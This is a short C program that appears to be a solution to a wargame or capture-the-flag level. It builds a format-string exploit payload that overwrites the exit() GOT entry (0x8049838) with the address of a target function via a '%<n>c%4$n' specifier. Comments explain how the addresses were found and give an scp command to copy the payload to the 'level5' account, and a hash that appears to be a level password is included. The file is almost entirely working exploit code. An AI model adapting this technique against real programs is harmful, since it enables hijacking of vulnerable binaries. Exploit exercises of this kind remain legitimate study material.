#include <unistd.h>
#include <stdio.h>

//gcc script.c && ./a.out > payload && scp -P 4242 payload level5@192.168.56.105:/tmp/payload5
//0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

int main() {
    int exit_plt_address = 0x8049838; //(found using `objdump --dynamic-reloc`)
    int o_address = 0x80484aa; //found using gdb
    int string_start_arg = 4; //found using the basic printf attack %p%p%p%p%p...
    write(1, &exit_plt_address, 4);
    printf("%%%ic%%%i$n\n", o_address - 4, string_start_arg); // results in: "%<o_addr - 4>c%4$n\n", but if we ever get another printf exploit of this kind we can just change 3 vars and be done with it :)
}